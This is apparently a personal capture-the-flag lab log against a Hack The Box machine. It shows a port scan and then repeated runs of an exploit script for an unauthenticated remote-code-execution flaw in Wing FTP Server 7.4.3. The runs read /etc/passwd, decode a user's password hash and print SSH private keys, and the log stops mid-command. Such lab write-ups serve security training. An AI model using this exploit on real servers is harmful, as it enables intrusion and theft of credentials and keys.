network enumeration:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey:
|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
80/tcp open  http    Apache httpd 2.4.66
|_http-server-header: Apache/2.4.66 (Debian)
|_http-title: Did not follow redirect to http://wingdata.htb/
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

found the subdomain name `ftp.wingdata.htb` by just clicking the button in the `wingdata.htb` , it is a FTP server software powered by Wing FTP Server `v7.4.3`

`CVE-2025-47812 : Wing FTP Server 7.4.3 - Unauthenticated Remote Code Execution (RCE)`

```
ajdev@rootbox:~/HTB/WingData$ python3 exploit.py -u http://ftp.wingdata.htb -c pwd

[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'pwd' and username: 'anonymous'
[+] UID extracted: d186e30929ff8fb9c3d56209d8f2b25af528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: d186e30929ff8fb9c3d56209d8f2b25af528764d624db129b32c21fbca0cb8d6

--- Command Output ---
/opt/wftpserver
----------------------

ajdev@rootbox:~/HTB/WingData$ python3 exploit.py -u http://ftp.wingdata.htb -c "cat /etc/passwd"

[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'cat /etc/passwd' and username: 'anonymous'
[+] UID extracted: ab61e7e20430f2ca814d63a869eb8e28f528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: ab61e7e20430f2ca814d63a869eb8e28f528764d624db129b32c21fbca0cb8d6

--- Command Output ---
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
wingftp:x:1000:1000:WingFTP Daemon User,,,:/opt/wingftp:/bin/bash
wacky:x:1001:1001::/home/wacky:/bin/bash
_laurel:x:999:996::/var/log/laurel:/bin/false
```

```
ajdev@rootbox:~/HTB/WingData$ python3 exploit.py -u http://ftp.wingdata.htb -c "ls"

[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'ls' and username: 'anonymous'
[+] UID extracted: 5d3e8695ce36382cb47239e130d1acd6f528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: 5d3e8695ce36382cb47239e130d1acd6f528764d624db129b32c21fbca0cb8d6

--- Command Output ---
Data
License.txt
Log
lua
pid-wftpserver.pid
README
session
session_admin
version.txt
webadmin
webclient
wftpconsole
wftp_default_ssh.key
wftp_default_ssl.crt
wftp_default_ssl.key
wftpserver
----------------------
```

```
ajdev@rootbox:~/HTB/WingData$ python3 exploit.py -u http://ftp.wingdata.htb -c "id"

[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'id' and username: 'anonymous'
[+] UID extracted: 3a2e58c9ff28c01e591d7be4bc4af598f528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: 3a2e58c9ff28c01e591d7be4bc4af598f528764d624db129b32c21fbca0cb8d6

--- Command Output ---
uid=1000(wingftp) gid=1000(wingftp) groups=1000(wingftp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
```

```
ajdev@rootbox:~/HTB/WingData$ python3 exploit.py -u http://ftp.wingdata.htb -c "find . -type f -name '*.xml'"

[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'find . -type f -name '*.xml'' and username: 'anonymous'
[+] UID extracted: f5a686aac538d57235de1053afb72548f528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: f5a686aac538d57235de1053afb72548f528764d624db129b32c21fbca0cb8d6

--- Command Output ---
./Data/_ADMINISTRATOR/admins.xml
./Data/_ADMINISTRATOR/settings.xml
./Data/1/users/maria.xml
./Data/1/users/steve.xml
./Data/1/users/wacky.xml
./Data/1/users/anonymous.xml
./Data/1/users/john.xml
./Data/1/settings.xml
./Data/1/portlistener.xml
./Data/settings.xml
./webadmin/crossdomain.xml
./webclient/crossdomain.xml
----------------------
```

```
ajdev@rootbox:~/HTB/WingData$ python3 exploit.py -u http://ftp.wingdata.htb -c "ls -la Data/1/users"

[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'ls -la Data/1/users' and username: 'anonymous'
[+] UID extracted: f01c084b102c656ca858d59a1f8c7fe4f528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: f01c084b102c656ca858d59a1f8c7fe4f528764d624db129b32c21fbca0cb8d6

--- Command Output ---
total 28
drwxr-x--- 2 wingftp wingftp 4096 Feb 14 22:54 .
drwxr-x--- 4 wingftp wingftp 4096 Feb  9 08:19 ..
-rwxr-x--- 1 wingftp wingftp 2843 Feb 14 22:54 anonymous.xml
-rwxr-x--- 1 wingftp wingftp 2846 Nov  2 11:13 john.xml
-rw-rw-rw- 1 wingftp wingftp 2847 Nov  2 12:05 maria.xml
-rw-rw-rw- 1 wingftp wingftp 2847 Nov  2 12:02 steve.xml
-rw-rw-rw- 1 wingftp wingftp 2856 Nov  2 12:28 wacky.xml
----------------------
```

```
ajdev@rootbox:~/HTB/WingData$ python3 exploit.py -u http://ftp.wingdata.htb -c "base64 Data/1/users/wacky.xml"

[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'base64 Data/1/users/wacky.xml' and username: 'anonymous'
[+] UID extracted: e85b8602a65174ba678b17e03d053837f528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: e85b8602a65174ba678b17e03d053837f528764d624db129b32c21fbca0cb8d6

--- Command Output ---
PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8VVNFUl9BQ0NPVU5UUyBEZXNjcmlwdGlvbj0iV2luZyBG
VFAgU2VydmVyIFVzZXIgQWNjb3VudHMiPgogICAgPFVTRVI+CiAgICAgICAgPFVzZXJOYW1lPndh
Y2t5PC9Vc2VyTmFtZT4KICAgICAgICA8RW5hYmxlQWNjb3VudD4xPC9FbmFibGVBY2NvdW50Pgog
ICAgICAgIDxFbmFibGVQYXNzd29yZD4xPC9FbmFibGVQYXNzd29yZD4KICAgICAgICA8UGFzc3dv
cmQ+MzI5NDBkZWZkM2MzZWY3MGEyZGQ0NGE1MzAxZmY5ODRjNDc0MmYwYmFhZTc2ZmY1Yjg3ODM5
OTRmOGE1MDNjYTwvUGFzc3dvcmQ+CiAgICAgICAgPFByb3RvY29sVHlwZT42MzwvUHJvdG9jb2xU
eXBlPgogICAgICAgIDxFbmFibGVFeHBpcmU+MDwvRW5hYmxlRXhwaXJlPgogICAgICAgIDxFeHBp
cmVUaW1lPjIwMjUtMTItMDIgMTI6MDI6NDY8L0V4cGlyZVRpbWU+CiAgICAgICAgPE1heERvd25s
b2FkU3BlZWRQZXJTZXNzaW9uPjA8L01heERvd25sb2FkU3BlZWRQZXJTZXNzaW9uPgogICAgICAg
IDxNYXhVcGxvYWRTcGVlZFBlclNlc3Npb24+MDwvTWF4VXBsb2FkU3BlZWRQZXJTZXNzaW9uPgog
ICAgICAgIDxNYXhEb3dubG9hZFNwZWVkUGVyVXNlcj4wPC9NYXhEb3dubG9hZFNwZWVkUGVyVXNl
cj4KICAgICAgICA8TWF4VXBsb2FkU3BlZWRQZXJVc2VyPjA8L01heFVwbG9hZFNwZWVkUGVyVXNl
cj4KICAgICAgICA8U2Vzc2lvbk5vQ29tbWFuZFRpbWVPdXQ+NTwvU2Vzc2lvbk5vQ29tbWFuZFRp
bWVPdXQ+CiAgICAgICAgPFNlc3Npb25Ob1RyYW5zZmVyVGltZU91dD41PC9TZXNzaW9uTm9UcmFu
c2ZlclRpbWVPdXQ+CiAgICAgICAgPE1heENvbm5lY3Rpb24+MDwvTWF4Q29ubmVjdGlvbj4KICAg
ICAgICA8Q29ubmVjdGlvblBlcklwPjA8L0Nvbm5lY3Rpb25QZXJJcD4KICAgICAgICA8UGFzc3dv
cmRMZW5ndGg+MDwvUGFzc3dvcmRMZW5ndGg+CiAgICAgICAgPFNob3dIaWRkZW5GaWxlPjA8L1No
b3dIaWRkZW5GaWxlPgogICAgICAgIDxDYW5DaGFuZ2VQYXNzd29yZD4wPC9DYW5DaGFuZ2VQYXNz
d29yZD4KICAgICAgICA8Q2FuU2VuZE1lc3NhZ2VUb1NlcnZlcj4wPC9DYW5TZW5kTWVzc2FnZVRv
U2VydmVyPgogICAgICAgIDxFbmFibGVTU0hQdWJsaWNLZXlBdXRoPjA8L0VuYWJsZVNTSFB1Ymxp
Y0tleUF1dGg+CiAgICAgICAgPFNTSFB1YmxpY0tleVBhdGg+PC9TU0hQdWJsaWNLZXlQYXRoPgog
ICAgICAgIDxTU0hBdXRoTWV0aG9kPjA8L1NTSEF1dGhNZXRob2Q+CiAgICAgICAgPEVuYWJsZVdl
Ymxpbms+MTwvRW5hYmxlV2VibGluaz4KICAgICAgICA8RW5hYmxlVXBsaW5rPjE8L0VuYWJsZVVw
bGluaz4KICAgICAgICA8RW5hYmxlVHdvRmFjdG9yPjA8L0VuYWJsZVR3b0ZhY3Rvcj4KICAgICAg
ICA8VHdvRmFjdG9yQ29kZT48L1R3b0ZhY3RvckNvZGU+CiAgICAgICAgPEV4dHJhSW5mbz48L0V4
dHJhSW5mbz4KICAgICAgICA8Q3VycmVudENyZWRpdD4wPC9DdXJyZW50Q3JlZGl0PgogICAgICAg
IDxSYXRpb0Rvd25sb2FkPjE8L1JhdGlvRG93bmxvYWQ+CiAgICAgICAgPFJhdGlvVXBsb2FkPjE8
L1JhdGlvVXBsb2FkPgogICAgICAgIDxSYXRpb0NvdW50TWV0aG9kPjA8L1JhdGlvQ291bnRNZXRo
b2Q+CiAgICAgICAgPEVuYWJsZVJhdGlvPjA8L0VuYWJsZVJhdGlvPgogICAgICAgIDxNYXhRdW90
YT4wPC9NYXhRdW90YT4KICAgICAgICA8Q3VycmVudFF1b3RhPjA8L0N1cnJlbnRRdW90YT4KICAg
ICAgICA8RW5hYmxlUXVvdGE+MDwvRW5hYmxlUXVvdGE+CiAgICAgICAgPE5vdGVzTmFtZT48L05v
dGVzTmFtZT4KICAgICAgICA8Tm90ZXNBZGRyZXNzPjwvTm90ZXNBZGRyZXNzPgogICAgICAgIDxO
b3Rlc1ppcENvZGU+PC9Ob3Rlc1ppcENvZGU+CiAgICAgICAgPE5vdGVzUGhvbmU+PC9Ob3Rlc1Bo
b25lPgogICAgICAgIDxOb3Rlc0ZheD48L05vdGVzRmF4PgogICAgICAgIDxOb3Rlc0VtYWlsPjwv
Tm90ZXNFbWFpbD4KICAgICAgICA8Tm90ZXNNZW1vPjwvTm90ZXNNZW1vPgogICAgICAgIDxFbmFi
bGVVcGxvYWRMaW1pdD4wPC9FbmFibGVVcGxvYWRMaW1pdD4KICAgICAgICA8Q3VyTGltaXRVcGxv
YWRTaXplPjA8L0N1ckxpbWl0VXBsb2FkU2l6ZT4KICAgICAgICA8TWF4TGltaXRVcGxvYWRTaXpl
PjA8L01heExpbWl0VXBsb2FkU2l6ZT4KICAgICAgICA8RW5hYmxlRG93bmxvYWRMaW1pdD4wPC9F
bmFibGVEb3dubG9hZExpbWl0PgogICAgICAgIDxDdXJMaW1pdERvd25sb2FkTGltaXQ+MDwvQ3Vy
TGltaXREb3dubG9hZExpbWl0PgogICAgICAgIDxNYXhMaW1pdERvd25sb2FkTGltaXQ+MDwvTWF4
TGltaXREb3dubG9hZExpbWl0PgogICAgICAgIDxMaW1pdFJlc2V0VHlwZT4wPC9MaW1pdFJlc2V0
VHlwZT4KICAgICAgICA8TGltaXRSZXNldFRpbWU+MTc2MjEwMzA4OTwvTGltaXRSZXNldFRpbWU+
CiAgICAgICAgPFRvdGFsUmVjZWl2ZWRCeXRlcz4wPC9Ub3RhbFJlY2VpdmVkQnl0ZXM+CiAgICAg
ICAgPFRvdGFsU2VudEJ5dGVzPjA8L1RvdGFsU2VudEJ5dGVzPgogICAgICAgIDxMb2dpbkNvdW50
PjI8L0xvZ2luQ291bnQ+CiAgICAgICAgPEZpbGVEb3dubG9hZD4wPC9GaWxlRG93bmxvYWQ+CiAg
ICAgICAgPEZpbGVVcGxvYWQ+MDwvRmlsZVVwbG9hZD4KICAgICAgICA8RmFpbGVkRG93bmxvYWQ+
MDwvRmFpbGVkRG93bmxvYWQ+CiAgICAgICAgPEZhaWxlZFVwbG9hZD4wPC9GYWlsZWRVcGxvYWQ+
CiAgICAgICAgPExhc3RMb2dpbklwPjEyNy4wLjAuMTwvTGFzdExvZ2luSXA+CiAgICAgICAgPExh
c3RMb2dpblRpbWU+MjAyNS0xMS0wMiAxMjoyODo1MjwvTGFzdExvZ2luVGltZT4KICAgICAgICA8
RW5hYmxlU2NoZWR1bGU+MDwvRW5hYmxlU2NoZWR1bGU+CiAgICA8L1VTRVI+CjwvVVNFUl9BQ0NP
VU5UUz4K
----------------------
```

after encode it output is :

```
<?xml version="1.0" ?>
<USER_ACCOUNTS Description="Wing FTP Server User Accounts">
    <USER>
        <UserName>wacky</UserName>
        <EnableAccount>1</EnableAccount>
        <EnablePassword>1</EnablePassword>
        <Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>
        <ProtocolType>63</ProtocolType>
        <EnableExpire>0</EnableExpire>
        <ExpireTime>2025-12-02 12:02:46</ExpireTime>
        <MaxDownloadSpeedPerSession>0</MaxDownloadSpeedPerSession>
        <MaxUploadSpeedPerSession>0</MaxUploadSpeedPerSession>
        <MaxDownloadSpeedPerUser>0</MaxDownloadSpeedPerUser>
        <MaxUploadSpeedPerUser>0</MaxUploadSpeedPerUser>
        <SessionNoCommandTimeOut>5</SessionNoCommandTimeOut>
        <SessionNoTransferTimeOut>5</SessionNoTransferTimeOut>
        <MaxConnection>0</MaxConnection>
        <ConnectionPerIp>0</ConnectionPerIp>
        <PasswordLength>0</PasswordLength>
        <ShowHiddenFile>0</ShowHiddenFile>
        <CanChangePassword>0</CanChangePassword>
        <CanSendMessageToServer>0</CanSendMessageToServer>
        <EnableSSHPublicKeyAuth>0</EnableSSHPublicKeyAuth>
        <SSHPublicKeyPath></SSHPublicKeyPath>
        <SSHAuthMethod>0</SSHAuthMethod>
        <EnableWeblink>1</EnableWeblink>
        <EnableUplink>1</EnableUplink>
        <EnableTwoFactor>0</EnableTwoFactor>
        <TwoFactorCode></TwoFactorCode>
        <ExtraInfo></ExtraInfo>
        <CurrentCredit>0</CurrentCredit>
        <RatioDownload>1</RatioDownload>
        <RatioUpload>1</RatioUpload>
        <RatioCountMethod>0</RatioCountMethod>
        <EnableRatio>0</EnableRatio>
        <MaxQuota>0</MaxQuota>
        <CurrentQuota>0</CurrentQuota>
        <EnableQuota>0</EnableQuota>
        <NotesName></NotesName>
        <NotesAddress></NotesAddress>
        <NotesZipCode></NotesZipCode>
        <NotesPhone></NotesPhone>
        <NotesFax></NotesFax>
        <NotesEmail></NotesEmail>
        <NotesMemo></NotesMemo>
        <EnableUploadLimit>0</EnableUploadLimit>
        <CurLimitUploadSize>0</CurLimitUploadSize>
        <MaxLimitUploadSize>0</MaxLimitUploadSize>
        <EnableDownloadLimit>0</EnableDownloadLimit>
        <CurLimitDownloadLimit>0</CurLimitDownloadLimit>
        <MaxLimitDownloadLimit>0</MaxLimitDownloadLimit>
        <LimitResetType>0</LimitResetType>
        <LimitResetTime>1762103089</LimitResetTime>
        <TotalReceivedBytes>0</TotalReceivedBytes>
        <TotalSentBytes>0</TotalSentBytes>
        <LoginCount>2</LoginCount>
        <FileDownload>0</FileDownload>
        <FileUpload>0</FileUpload>
        <FailedDownload>0</FailedDownload>
        <FailedUpload>0</FailedUpload>
        <LastLoginIp>127.0.0.1</LastLoginIp>
        <LastLoginTime>2025-11-02 12:28:52</LastLoginTime>
        <EnableSchedule>0</EnableSchedule>
    </USER>
</USER_ACCOUNTS>
```

```
(venv) ajdev@rootbox:~/HTB/WingData$ python3 exploitdb.py -u http://ftp.wingdata.htb -c "ls -la /opt/wftpserver/session"

[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'ls -la /opt/wftpserver/session' and username: 'anonymous'
[+] UID extracted: 2a9023d2f17beb091463e1e95e6dffaaf528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: 2a9023d2f17beb091463e1e95e6dffaaf528764d624db129b32c21fbca0cb8d6

--- Command Output ---
total 44
drwxr-x--- 2 wingftp wingftp 4096 Feb 15 10:29 .
drwxr-x--- 9 wingftp wingftp 4096 Feb 15 09:15 ..
-rw------- 1 wingftp wingftp  205 Feb 15 10:29 2a9023d2f17beb091463e1e95e6dffaaf528764d624db129b32c21fbca0cb8d6.lua
-rw------- 1 wingftp wingftp  129 Feb 15 10:19 43d0d57ab0299b46b0ce9b8448cad6a6f528764d624db129b32c21fbca0cb8d6.lua
-rw------- 1 wingftp wingftp  129 Feb 15 10:19 4fbfa85450eb8d2a74117da1ed8f6e8ef528764d624db129b32c21fbca0cb8d6.lua
-rw------- 1 wingftp wingftp  129 Feb 15 10:23 61d048d9ede0e9c066265a2b2cf0dda4f528764d624db129b32c21fbca0cb8d6.lua
-rw------- 1 wingftp wingftp  129 Feb 15 10:27 6b0a2a284ba2015eb96573a7037bd116f528764d624db129b32c21fbca0cb8d6.lua
-rw------- 1 wingftp wingftp  129 Feb 15 10:24 815770b86d93aedfa7c06fae64905d33f528764d624db129b32c21fbca0cb8d6.lua
-rw------- 1 wingftp wingftp  129 Feb 15 10:28 88452282076d82ab4be5dbf8bc527a9df528764d624db129b32c21fbca0cb8d6.lua
-rw------- 1 wingftp wingftp  129 Feb 15 10:19 bbd3e6be6a400b4ebf88c2219366628ff528764d624db129b32c21fbca0cb8d6.lua
-rw------- 1 wingftp wingftp  129 Feb 15 10:26 fd1fe4640c92ed1053aa21f3f1dfc939f528764d624db129b32c21fbca0cb8d6.lua
----------------------
(venv) ajdev@rootbox:~/HTB/WingData$ python3 exploitdb.py -u http://ftp.wingdata.htb -c "ls -la /opt/wftpserver/Data"

[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'ls -la /opt/wftpserver/Data' and username: 'anonymous'
[+] UID extracted: e7c0c2e70f3268f8380132be9159cd01f528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: e7c0c2e70f3268f8380132be9159cd01f528764d624db129b32c21fbca0cb8d6

--- Command Output ---
total 40
drwxr-x--- 4 wingftp wingftp  4096 Feb 15 09:15 .
drwxr-x--- 9 wingftp wingftp  4096 Feb 15 09:15 ..
drwxr-x--- 4 wingftp wingftp  4096 Feb  9 08:19 1
drwxr-x--- 2 wingftp wingftp  4096 Feb 15 09:15 _ADMINISTRATOR
-rw------- 1 wingftp wingftp 11264 Nov  2 11:11 bookmark_db
-rwxr-x--- 1 wingftp wingftp  2554 Nov  2 16:23 settings.xml
-rwxr-x--- 1 wingftp wingftp   241 Nov  2 11:12 ssh_host_ecdsa_key
-rw-rw-rw- 1 wingftp wingftp  3272 Nov  2 11:52 ssh_host_key
----------------------
```

```
(venv) ajdev@rootbox:~/HTB/WingData$ python3 exploitdb.py -u http://ftp.wingdata.htb -c "cat /opt/wftpserver/Data/ssh_host_key"

[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'cat /opt/wftpserver/Data/ssh_host_key' and username: 'anonymous'
[+] UID extracted: 88de062da77fd9e04c86d72a42fcc457f528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: 88de062da77fd9e04c86d72a42fcc457f528764d624db129b32c21fbca0cb8d6

--- Command Output ---
-----BEGIN PRIVATE KEY-----
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
vR0xq1V8fWBcRKspxLBgt7rk1Al9Vw==
-----END PRIVATE KEY-----
----------------------
```

```
(venv) ajdev@rootbox:~/HTB/WingData$ python3 exploitdb.py -u http://ftp.wingdata.htb -c "cat /opt/wftpserver/Data/ssh_host_ecdsa_key"

[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'cat /opt/wftpserver/Data/ssh_host_ecdsa_key' and username: 'anonymous'
[+] UID extracted: 1c63e214e37362a879c164d3b4402553f528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: 1c63e214e37362a879c164d3b4402553f528764d624db129b32c21fbca0cb8d6

--- Command Output ---
-----BEGIN PRIVATE KEY-----
MIGHAgEAMBMGByqGSM49AgEGCCqGSM49AwEHBG0wawIBAQQgQi9rTL6fS2Ehkzbx
szBUWz+6Sl91XETiFdQlhJj5gmuhRANCAARODo05vFXlRJk/aw0csXW7ee0fDWQ8
XkMZG9gpr5WZstPaTJqvAVbJvl6NgrPgrCMgOqrC3z2CgZKys5vQhMLa
-----END PRIVATE KEY-----
----------------------
```

```
(venv) ajdev@rootbox:~/HTB/WingData$ python3 exploitdb.py -u http://ftp.wingdata.htb -c "ls Log"

[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'ls Log' and username: 'anonymous'
[+] UID extracted: bac5129ec2566964f969254815754c3ef528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: bac5129ec2566964f969254815754c3ef528764d624db129b32c21fbca0cb8d6

--- Command Output ---
Admin
audit_db
Domains
ssh_debug_log
System
----------------------
(venv) ajdev@rootbox:~/HTB/WingData$ python3 exploitdb.py -u http://ftp.wingdata.htb -c "ls -la Log"

[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'ls -la Log' and username: 'anonymous'
[+] UID extracted: 01e2ed0957360dc57f6b82b2b015ba9cf528764d624db129b32c21fbca0cb8d6
